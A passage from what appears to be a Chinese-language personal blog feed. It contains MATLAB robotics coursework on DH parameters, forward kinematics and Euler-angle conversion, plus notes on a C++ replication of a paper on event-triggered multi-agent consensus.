      <category>控制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>理论</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>robotics section 3 matlab practice</title>
    <link href="/2025/04/17/robotics-section-3-matlab-practice/"/>
    <url>/2025/04/17/robotics-section-3-matlab-practice/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="robotics-section-3-matlab-practice">robotics section 3 matlabpractice</h1><p>本练习主要讨论平面3自由度、3R机器人的DH坐标参数和正向(位姿)运动学变换方程(见图3-6和图3-7)。已知下列固定长度参数:<spanclass="math inline">\(L_1=4\)</span>,<spanclass="math inline">\(L_2=3\)</span>和<spanclass="math inline">\(L_3=2\)</span>(米)。</p><h2 id="a">a</h2><h3 id="题目">题目</h3><p>求D-H参数。</p><h3 id="解答">解答</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs matlab">clear;clc;<br>syms theta1 theta2 theta3 l1 l2 l3<span class="hljs-comment">%符号函数，真的好用</span><br>L(<span class="hljs-number">1</span>) = Link([theta1 <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>],<span class="hljs-string">&#x27;modified&#x27;</span>);<br>L(<span class="hljs-number">2</span>) = Link([theta2 <span class="hljs-number">0</span> l1 <span class="hljs-number">0</span>],<span class="hljs-string">&#x27;modified&#x27;</span>);<br>L(<span class="hljs-number">3</span>) = Link([theta3 <span class="hljs-number">0</span> l2 <span class="hljs-number">0</span>],<span class="hljs-string">&#x27;modified&#x27;</span>);<br>Three_Link = SerialLink(L,<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;threelink&#x27;</span>);<br>Three_Link.display;<br></code></pre></td></tr></table></figure><h3 id="结果">结果</h3><figure><img src="/img/robotics-section-3-matlab-practice/result_a.png"alt="result_a" /><figcaption aria-hidden="true">result_a</figcaption></figure><h2 id="b">b</h2><h3 id="题目-1">题目</h3><p>推导相邻的齐次变换矩阵<spanclass="math inline">\(^{i-1}_{i}T\)</span>，它们是关节角度变量<spanclass="math inline">\(\theta_i\)</span>(i=1,2,3)的函数。用试探法推导常量矩阵<spanclass="math inline">\(^3_HT\)</span>。这里，{H}的原点在夹爪手指的中心，{H}的姿态与{3}的姿态相同。</p><h3 id="解答-1">解答</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs matlab">clc;clear;<br>syms theta1 theta2 theta3 theta4 l1 l2 l3<br><span class="hljs-comment">%齐次变换矩阵</span><br>syms alphai_1 ai_1 di thetai<br>i_1iT=[<span class="hljs-built_in">cos</span>(thetai) -<span class="hljs-built_in">sin</span>(thetai) <span class="hljs-number">0</span> ai_1<br>    <span class="hljs-built_in">sin</span>(thetai)*<span class="hljs-built_in">cos</span>(alphai_1) <span class="hljs-built_in">cos</span>(thetai)*<span class="hljs-built_in">cos</span>(alphai_1) -<span class="hljs-built_in">sin</span>(alphai_1) -<span class="hljs-built_in">sin</span>(alphai_1)*di<br>    <span class="hljs-built_in">sin</span>(thetai)*<span class="hljs-built_in">sin</span>(alphai_1) <span class="hljs-built_in">cos</span>(thetai)*<span class="hljs-built_in">sin</span>(alphai_1) <span class="hljs-built_in">cos</span>(alphai_1) <span class="hljs-built_in">cos</span>(alphai_1)*di<br>    <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span>];<br><span class="hljs-comment">%R = subs(S, old, new) 利用new的值代替符号表达式中old的值</span><br>T01=subs(i_1iT,[alphai_1 ai_1 di thetai],[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> theta1])<br>T12=subs(i_1iT,[alphai_1 ai_1 di thetai],[<span class="hljs-number">0</span> l1 <span class="hljs-number">0</span> theta2])<br>T23=subs(i_1iT,[alphai_1 ai_1 di thetai],[<span class="hljs-number">0</span> l2 <span class="hljs-number">0</span> theta3])<br>T3H=subs(i_1iT,[alphai_1 ai_1 di thetai],[<span class="hljs-number">0</span> l3 <span class="hljs-number">0</span> <span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure><h3 id="结果-1">结果</h3><figure><img src="/img/robotics-section-3-matlab-practice/result_b.png"alt="result_b" /><figcaption aria-hidden="true">result_b</figcaption></figure><h2 id="c">c</h2><h3 id="题目-2">题目</h3><p>用MATLAB符号法求正向运动学解<spanclass="math inline">\(^0_3T\)</span>和<spanclass="math inline">\(^0_HT\)</span>(<span class="math inline">\(\theta_i\)</span>的函数)。用s=sin(<spanclass="math inline">\(\theta\)</span>),c=cos(<spanclass="math inline">\(\theta\)</span>)等简写你的结果。由于<spanclass="math inline">\(Z_i\)</span>轴相互平行，因此可以用二角和公式将(<spanclass="math inline">\(\theta_1 + \theta_2 +\theta_3\)</span>)简写。用MATLAB计算正向运动学解(<spanclass="math inline">\(^0_3T\)</span>和<spanclass="math inline">\(^0_HT\)</span>)。输入参数为:<br />i) <span class="math inline">\(\theta_1\)</span>=0°,<spanclass="math inline">\(\theta_2\)</span>=0°,<spanclass="math inline">\(\theta_3\)</span>=0°;<br />ii) <span class="math inline">\(\theta_1\)</span>=10°,<spanclass="math inline">\(\theta_2\)</span>=20°,<spanclass="math inline">\(\theta_3\)</span>=30°;<br />iii) <span class="math inline">\(\theta_1\)</span>=90°,<spanclass="math inline">\(\theta_2\)</span>=90°,<spanclass="math inline">\(\theta_3\)</span>=90°;<br />对于这三种情况，可以利用操作臂位形简图校核结果，用试探法推导正向运动学变换(参考由旋转矩阵和位置矢量定义<spanclass="math inline">\(^0_HT\)</span>的方法)。简图中包括坐标系{H}，{3}和{0}。</p><h3 id="解答-2">解答</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs matlab">clc;clear;<br>syms theta1 theta2 theta3 theta4 l1 l2 l3<br><span class="hljs-comment">%齐次变换矩阵</span><br>syms alphai_1 ai_1 di thetai<br>i_1iT=[<span class="hljs-built_in">cos</span>(thetai) -<span class="hljs-built_in">sin</span>(thetai) <span class="hljs-number">0</span> ai_1<br>    <span class="hljs-built_in">sin</span>(thetai)*<span class="hljs-built_in">cos</span>(alphai_1) <span class="hljs-built_in">cos</span>(thetai)*<span class="hljs-built_in">cos</span>(alphai_1) -<span class="hljs-built_in">sin</span>(alphai_1) -<span class="hljs-built_in">sin</span>(alphai_1)*di<br>    <span class="hljs-built_in">sin</span>(thetai)*<span class="hljs-built_in">sin</span>(alphai_1) <span class="hljs-built_in">cos</span>(thetai)*<span class="hljs-built_in">sin</span>(alphai_1) <span class="hljs-built_in">cos</span>(alphai_1) <span class="hljs-built_in">cos</span>(alphai_1)*di<br>    <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span>];<br><span class="hljs-comment">%R = subs(S, old, new) 利用new的值代替符号表达式中old的值</span><br>T01=subs(i_1iT,[alphai_1 ai_1 di thetai],[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> theta1]);<br>T12=subs(i_1iT,[alphai_1 ai_1 di thetai],[<span class="hljs-number">0</span> l1 <span class="hljs-number">0</span> theta2]);<br>T23=subs(i_1iT,[alphai_1 ai_1 di thetai],[<span class="hljs-number">0</span> l2 <span class="hljs-number">0</span> theta3]);<br>T3H=subs(i_1iT,[alphai_1 ai_1 di thetai],[<span class="hljs-number">0</span> l3 <span class="hljs-number">0</span> <span class="hljs-number">0</span>]);<br>T03=T01*T12*T23<br>T0H=T01*T12*T23*T3H<br>T03i=subs(T03,[theta1 theta2 theta3],[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>])<br>T0Hi=subs(T0H,[theta1 theta2 theta3],[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>])<br>T03ii=subs(T03,[theta1 theta2 theta3],[<span class="hljs-number">10</span> <span class="hljs-number">20</span> <span class="hljs-number">30</span>])<br>T0Hii=subs(T0H,[theta1 theta2 theta3],[<span class="hljs-number">10</span> <span class="hljs-number">20</span> <span class="hljs-number">30</span>])<br>T03iii=subs(T03,[theta1 theta2 theta3],[<span class="hljs-number">10</span> <span class="hljs-number">20</span> <span class="hljs-number">30</span>])<br>T0Hiii=subs(T0H,[theta1 theta2 theta3],[<span class="hljs-number">10</span> <span class="hljs-number">20</span> <span class="hljs-number">30</span>])<br></code></pre></td></tr></table></figure><h3 id="结果-2">结果</h3><p><img src="/img/robotics-section-3-matlab-practice/result_c_1.png"alt="result_c" /> <imgsrc="/img/robotics-section-3-matlab-practice/result_c_2.png"alt="result_c" /></p><h3 id="d">d</h3><h3 id="题目-3">题目</h3><p>用Corke MATLABRobotics工具箱检验计算结果。试用函数link()，robot()和fkine()。</p><h3 id="解答-3">解答</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs matlab">syms theta1 theta2 theta3 L1 L2 L3<br>L(<span class="hljs-number">1</span>) = Link([theta1 <span class="hljs-number">0</span>  <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>],<span class="hljs-string">&#x27;modified&#x27;</span>);<br>L(<span class="hljs-number">2</span>) = Link([theta2 <span class="hljs-number">0</span>  <span class="hljs-number">4</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>],<span class="hljs-string">&#x27;modified&#x27;</span>);<br>L(<span class="hljs-number">3</span>) = Link([theta3 <span class="hljs-number">0</span>  <span class="hljs-number">3</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>],<span class="hljs-string">&#x27;modified&#x27;</span>);<br>L(<span class="hljs-number">4</span>) = Link([<span class="hljs-number">0</span>      <span class="hljs-number">0</span>  <span class="hljs-number">2</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span>],<span class="hljs-string">&#x27;modified&#x27;</span>);<br>Three_Link = SerialLink(L,<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;threelink&#x27;</span>);<br><span class="hljs-comment">%用户输入均为角度</span><br>theta1 = input (<span class="hljs-string">&#x27;Please enter theta1 = &#x27;</span>);<br>theta2 = input (<span class="hljs-string">&#x27;Please enter theta2 = &#x27;</span>);<br>theta3 = input (<span class="hljs-string">&#x27;Please enter theta3 = &#x27;</span>);<br><span class="hljs-comment">%只要有一个输入为空，就结束程序</span><br>empty = <span class="hljs-built_in">isempty</span>(theta1)+<span class="hljs-built_in">isempty</span>(theta2)+<span class="hljs-built_in">isempty</span>(theta3);<br><span class="hljs-keyword">if</span> empty&gt;<span class="hljs-number">0</span><br>    fprintf(<span class="hljs-string">&#x27;Error!&#x27;</span>);<br><span class="hljs-keyword">else</span>     <br>    digits(<span class="hljs-number">4</span>);<span class="hljs-comment">%设置只保留小数点后4位</span><br>    T = Three_Link.fkine([theta1,theta2,theta3,<span class="hljs-number">0</span>]);<span class="hljs-comment">%此时为分数</span><br>    A = vpa(T)<span class="hljs-comment">%变换为小数输出</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h3 id="结果-3">结果</h3><figure><img src="/img/robotics-section-3-matlab-practice/result_d.png"alt="result_d" /><figcaption aria-hidden="true">result_d</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>控制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>理论</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>multi agent replication</title>
    <link href="/2025/04/12/multi-agent-replication/"/>
    <url>/2025/04/12/multi-agent-replication/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1id="论文event-triggered-design-for-optimal-output-consensus-of-high-order-multi-agent-systems复现">论文《Event-triggeredDesign for Optimal Output Consensus of High-order Multi-agentSystems》复现</h1><h2 id="论文信息">1. 论文信息</h2><ul><li>论文标题: Event-triggered Design for Optimal Output Consensus ofHigh-order Multi-agent Systems<br /></li><li>论文链接: <a href="https://arxiv.org/abs/2206.08570">Event-triggeredDesign for Optimal Output Consensus of High-order Multi-agentSystems</a><br /></li><li>作者: Yutao Tang, Huaihui Liu, Ruonan Li, Kui Zhu<br /></li><li>Abstract: This paper studies the optimal output consensus problemfor a group of heterogeneous linear multi-agent systems. Different fromexisting results, we aim at effective controllers for these high-orderagents under both event-triggered control and event-triggeredcommunication settings. We conduct an embedded design for the problemand constructively propose a multi-rate event-triggered controller witha set of applicable parameters. The proposed event-triggered rules areshown to be free of Zeno behaviors and can achieve the optimal outputconsensus goal for these high-order agents. A simulation example isgiven to verify the efficacy of our designs.</li></ul><h2 id="代码复现">代码复现</h2><p>依赖Eigen库进行矩阵计算, clion编译运行.</p><p>绘图使用matplotlib, 编译器为pycharm.</p><h3 id="代码结构">1. 代码结构</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">agent.h <span class="hljs-comment"># agent类的头文件</span><br>agent.cpp <span class="hljs-comment"># 对单个agent的定义, 核心代码</span><br>test.cpp <span class="hljs-comment"># 测试函数, 用于测试单个agent的运行</span><br>main.cpp <span class="hljs-comment"># 主函数, 对论文仿真示例的实现</span><br></code></pre></td></tr></table></figure><p>核心部分就是UpdateController, UpdateSignalGenerator,UpdateDynamics三个函数. UpdateSignalGenerator实现upper lawer,核心部分就是UpdateController实现lower lawer.首先调用ShouldTrigger函数判断是否满足ETC条件, 如果满足, 则更新输入.UpdateDynamics三个函数实现agent的动力学更新.</p><p>状态的更新采用Runge-Kutta方法, 实现方法如下: <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> rk4 = [&amp;](<span class="hljs-type">const</span> Eigen::VectorXd&amp; x_in) -&gt; Eigen::VectorXd &#123;<br>        <span class="hljs-keyword">return</span> A_ * x_in + B_ * u_;<br>&#125;;<br>Eigen::VectorXd k1 = <span class="hljs-built_in">rk4</span>(x_);<br>Eigen::VectorXd k2 = <span class="hljs-built_in">rk4</span>(x_ + <span class="hljs-number">0.5</span> * dt * k1);<br>Eigen::VectorXd k3 = <span class="hljs-built_in">rk4</span>(x_ + <span class="hljs-number">0.5</span> * dt * k2);<br>Eigen::VectorXd k4 = <span class="hljs-built_in">rk4</span>(x_ + dt * k3);<br>x_ = x_ + (dt / <span class="hljs-number">6</span>) * (k1 + <span class="hljs-number">2</span> * k2 + <span class="hljs-number">2</span> * k3 + k4);<br></code></pre></td></tr></table></figure></p><p>plot目录下为python绘图代码. <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">plot/plot.py <span class="hljs-comment"># 绘图代码</span><br>plot/z.png <span class="hljs-comment"># 仿真结果</span><br>test.py <span class="hljs-comment"># 测试代码, 可以忽略</span><br></code></pre></td></tr></table></figure></p><h3 id="仿真结果">2. 仿真结果</h3><figure><img src="/img/multi-agent-replication/z.png" alt="result.png" /><figcaption aria-hidden="true">result.png</figcaption></figure><p>效果不好, 但是可以看出, 一致性是达到了的, 收敛到0.5附近.</p><h3 id="期间遇到的问题">3. 期间遇到的问题</h3><h4 id="event-triggered-controletc设计死锁">3.1Event-triggered-control(ETC)设计死锁</h4><p>起初在实现ETC逻辑时, 采用的方法是先判断是否满足ETC条件,再判断是否需要更新输入. 这种情况会导致agent的状态不更新, 造成死锁.也就是说, ETC条件是永远不满足的, 因为依赖agent的状态更新.而agent状态更新的前提是ETC条件满足. 解决方法是, 引入state_new变量,先更新状态, 再判断event-trigger条件, 如果满足条件, 则更新状态.这样就可以避免死锁问题.</p><p>代码中的实现如下: <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp">u_new_ = K1_ * x_ + K2_ * z_;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">ShouldTriggerControl</span>(t)) &#123;<br>    u_ = u_new_;<br>    u_hat_ = u_;<br>    last_control_time_ = t;<br>&#125;<br></code></pre></td></tr></table></figure></p><p>然而, 笔者在完成此逻辑后, 不由产生了一个疑问,ETC的设计是为了减少资源消耗, 但是如果每次都更新状态,那么不就失去了ETC的意义吗? 后面找了找资料, 仔细想了想, 大概可以这样理解:<strong>ETC节省的是执行, 而不是观测和预测</strong>. 观测不可避免,获取系统状态是必需的, 但是执行是可以避免的.ETC的设计主要是为了减少执行的频率, 减少通信/执行开销.</p><h4 id="z的更新问题">3.2 z的更新问题</h4><p>在实现z更新的逻辑时, ShouldTriggerCommunication是写错了的,所以跑出来的结果很奇怪. 当时是判断ETC条件满足后, 更新z.实际上应该是更新z_dot才对, 也就是z的导数. 而z的更新是整个过程都要进行的.z的更新也是采用了Runge-Kutta方法. 这个问题已经修复了. <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> [k1_z, k1_v] = <span class="hljs-built_in">rk4</span>(z_, v_);<br><span class="hljs-keyword">auto</span> [k2_z, k2_v] = <span class="hljs-built_in">rk4</span>(z_ + <span class="hljs-number">0.5</span> * dt * k1_z, v_ + <span class="hljs-number">0.5</span> * dt * k1_v);<br><span class="hljs-keyword">auto</span> [k3_z, k3_v] = <span class="hljs-built_in">rk4</span>(z_ + <span class="hljs-number">0.5</span> * dt * k2_z, v_ + <span class="hljs-number">0.5</span> * dt * k2_v);<br><span class="hljs-keyword">auto</span> [k4_z, k4_v] = <span class="hljs-built_in">rk4</span>(z_ + dt * k3_z, v_ + dt * k3_v);<br>z_dot_new_ = (<span class="hljs-number">1.0</span> / <span class="hljs-number">6</span>) * (k1_z + <span class="hljs-number">2</span> * k2_z + <span class="hljs-number">2</span> * k3_z + k4_z);<br>v_dot_new_ = (<span class="hljs-number">1.0</span> / <span class="hljs-number">6</span>) * (k1_v + <span class="hljs-number">2</span> * k2_v + <span class="hljs-number">2</span> * k3_v + k4_v);<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">ShouldTriggerCommunication</span>(t)) &#123;<br>    z_dot_ = z_dot_new_;<br>    v_dot_ = v_dot_new_;<br>    z_hat_ = z_;<br>    v_hat_ = v_;<br>    last_comm_time_ = t;<br>&#125;<br>z_ += z_dot_ * dt;<br>v_ += v_dot_ * dt;<br></code></pre></td></tr></table></figure>还有就是注意1.0/6的写法, 不能直接写成1/6, 否则会变成0~</p><h4 id="参数疑问">3.3 参数疑问</h4><p>最后得到的结果很不好, 可能是参数设置的问题,更有可能是笔者对论文理解的不够深入, 所以部分逻辑实现错误.</p><h4 id="agent-3">Agent-3</h4><p>仿真结果得到z是满足一致性要求的,但是agent-3的状态输出y却没办法收敛到z3. 暂时没有找到原因.</p><h2 id="理论分析">理论分析</h2><h3 id="理论基础">1. 理论基础</h3>对于多智能体系统, 考虑高阶线性系统:<br />$$<span class="math display">\[\begin{aligned}\dot{x}_i(t) &amp;= A_ix_i(t) + B_iu_i(t), \\y_i(t) &amp;= C_ix_i(t), \\\end{aligned}\]</span><p>$$ 每个智能体具有不同的动态特性(异构).</p><p>考虑最优一致性问题, 目标是设计控制器使得所有智能体的输出一致,设计分布式控制器使得:<br /><span class="math display">\[\begin{aligned}\lim_{t \to \infty} | y_i(t) - y_j(t) | \to 0,\\\lim_{t \to \infty} y_i(t) = y^* \\\end{aligned}\]</span> 上面第一个式子保证i-th智能体和其邻居j-th智能体的输出一致,第二个式子保证所有智能体的输出一致. 其中<spanclass="math inline">\(y^*\)</span>是所有智能体的输出一致性目标,也是下列最优控制问题的解:<br /><span class="math display">\[\begin{aligned}y^* = \arg \min_{s \in R} \sum_{i=1}^N f_i(s) \\\end{aligned}\]</span> 其中函数<spanclass="math inline">\(f_i(s)\)</span>是每个智能体的局部目标函数,由每个智能体的状态输出决定.</p><p>总的来说, 论文的目标是设计一个分布式控制器, 使得所有智能体的输出一致,并且最小化每个智能体的局部目标函数.</p><h3 id="信号生成器设计">2. 信号生成器设计</h3><p>我们期望每个agent i生成一个状态<spanclass="math inline">\(y_i\)</span>, 使得所有的<spanclass="math inline">\(y_i(t) \to y^*\)</span>, 其中:<br /><span class="math display">\[\begin{aligned}y^* = \arg \min_{s \in R} \sum_{i=1}^N f_i(s) \\\end{aligned}\]</span></p><h4 id="梯度下降">梯度下降</h4><p>对优化问题:<br /><span class="math display">\[\min_{s \in R} \sum_{i=1}^N f_i(s)\]</span> 经典梯度下降为:<br /><span class="math display">\[s_{k+1} = s_k - \alpha \nabla f(s_k)\]</span> 可以写作:<br /><span class="math display">\[\dot{z} = -\alpha \sum_{i=1}^N \nabla f_i(z)\]</span> 分布式控制下, 每个agent i都可以得到局部目标函数<spanclass="math inline">\(f_i\)</span>, 于是设计如下的控制器:<br /><span class="math display">\[\dot{z}_i = -\alpha \nabla f_i(z_i) + \beta \sum_{j = 1}^{N} a_{ij} (z_i- z_j)\]</span> 上式是论文中的写法, 引入了<spanclass="math inline">\(a_{ij}\)</span>, 也就是邻接矩阵, 使得每个agenti只和其邻居进行通信. 当agent i和j相邻时, <spanclass="math inline">\(a_{ij} = 1\)</span>, 否则<spanclass="math inline">\(a_{ij} = 0\)</span>. 等价于:<br /><span class="math display">\[\dot{z}_i = -\alpha \nabla f_i(z_i) + \beta \sum_{j \in N_i} (z_i - z_j)\]</span> 其中<span class="math inline">\(N_i\)</span>是agenti的邻居集合.</p><p>上式可以看作是一个分布式的梯度下降算法, 其中第一项是agenti的局部目标函数的梯度, 驱动<spanclass="math inline">\(z_i\)</span>向<spanclass="math inline">\(f_i\)</span>的最小点收敛, 以满足局部最优目标,第二项是agent i和其邻居之间的差异, 驱动<spanclass="math inline">\(z_i\)</span>向邻居靠拢, 体现一致性的满足.通过调整<span class="math inline">\(\alpha\)</span>和<spanclass="math inline">\(\beta\)</span>的值,可以控制每个agent的收敛速度和一致性.</p><h4 id="辅助变量">辅助变量</h4><p>上述算法对于高阶系统或复杂网络不够稳定,在事件触发控制环境下收敛精度不高或速度慢. 于是引入辅助变量<spanclass="math inline">\(v_i\)</span>增加一个"动量项", 使得每个agenti的控制器为:<br /><span class="math display">\[\begin{aligned}\dot{z}_i &amp;= -\alpha \nabla f_i(z_i) + \beta \sum_{j \in N_i} (z_i -z_j) + \sum_{j \in N_i} (v_i - v_j), \\\dot{v}_i &amp;= \alpha \beta \sum_{j \in N_i} (z_i - z_j)\\\end{aligned}\]</span> 可以理解为, <spanclass="math inline">\(v_i\)</span>是一个积分项, 类似于PID控制中的积分项,用于增加系统的稳定性:<br /><span class="math display">\[\dot{v}_i = \alpha \beta \sum_{j \in N_i} (z_i - z_j)\]</span> 得到 <span class="math display">\[v_i = \alpha \beta \int_0^t \sum_{j \in N_i} (z_i - z_j) dt\]</span> <span class="math inline">\(v_i -v_j\)</span>可以理解为历史中一致性误差反馈,根据历史中邻居agent作用的大小来判断当前是要"缓一缓"还是要"加速",从而更柔和和稳定, 快速达到一致性.</p><hr /><p>github仓库:<ahref="https://github.com/symcreg/multi_agent">multi_agent</a><br />博客:<ahref="https://symc.wang/multi-agent-replication/">multi-agent-replication</a></p>]]></content>
    
    
    <categories>
      
      <category>分布式控制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>论文复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>robotics section 2 practice 1</title>
    <link href="/2025/04/09/robotics-section-2-practice-1/"/>
    <url>/2025/04/09/robotics-section-2-practice-1/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="robotics-section-2-practice-1">robotics section 2 practice1</h1><h2 id="a">a</h2><h3 id="题目">题目</h3><p>用Z-Y-X(<span class="math inline">\(\alpha\)</span>-<spanclass="math inline">\(\beta\)</span>-<spanclass="math inline">\(\gamma\)</span>)欧拉角表示法，写出MATLAB程序，当用户输入欧拉角<spanclass="math inline">\(\alpha\)</span>-<spanclass="math inline">\(\beta\)</span>-<spanclass="math inline">\(\gamma\)</span>时，计算旋转矩阵<spanclass="math inline">\(^A_BR\)</span>。</p><h3 id="解答">解答</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><br><span class="hljs-comment">%%ZYX欧拉角转旋转矩阵</span><br><span class="hljs-comment">%输入角度</span><br>R_z=input(<span class="hljs-string">&#x27;Rotate around the z-axis in alpha =&#x27;</span>);<br>R_y=input(<span class="hljs-string">&#x27;Rotate around the y-axis in beta =&#x27;</span>);<br>R_x=input(<span class="hljs-string">&#x27;Rotate around the x-axis in gamma =&#x27;</span>);<br><span class="hljs-comment">%只要有一个输入为空，输出警告</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">isempty</span>(R_z)+<span class="hljs-built_in">isempty</span>(R_y)+<span class="hljs-built_in">isempty</span>(R_x)&gt;<span class="hljs-number">0</span><br>    fprintf(<span class="hljs-string">&#x27;Error!&#x27;</span>);<br><span class="hljs-keyword">else</span><br>    R=rotz(R_z)*roty(R_y)*rotx(R_x);<span class="hljs-comment">%ZYX</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h3 id="结果">结果</h3><p><img src="/img/robotics-section-2-practice-1/p_a_1.png"alt="result_a" /> <imgsrc="/img/robotics-section-2-practice-1/p_a_2.png" alt="result_a" /></p><h2 id="b">b</h2><h3 id="题目-1">题目</h3><p>编写一个MATLAB程序。当输入旋转矩阵<spanclass="math inline">\(^A_BR\)</span>时，计算出欧拉角<spanclass="math inline">\(\alpha\)</span>-<spanclass="math inline">\(\beta\)</span>-<spanclass="math inline">\(\gamma\)</span>(反解问题)。计算两个可能的解。证明a)中两种情况的反解。使用循环方法检查你的结果是否正确(即将a)中的欧拉角输入到程序a;将得到的旋转矩阵<spanclass="math inline">\(^A_BR\)</span>输入到程序b;你将得到两组解答:一组应当是用户原来的输入值，而另一组可用a)中的程序反复验证。</p><h3 id="解答-1">解答</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">%% 旋转矩阵转 ZYX 欧拉角</span><br><span class="hljs-comment">% 输入旋转矩阵</span><br>R_11 = input(<span class="hljs-string">&#x27;R_11 = &#x27;</span>);<br>R_12 = input(<span class="hljs-string">&#x27;R_12 = &#x27;</span>);<br>R_13 = input(<span class="hljs-string">&#x27;R_13 = &#x27;</span>);<br>R_21 = input(<span class="hljs-string">&#x27;R_21 = &#x27;</span>);<br>R_22 = input(<span class="hljs-string">&#x27;R_22 = &#x27;</span>);<br>R_23 = input(<span 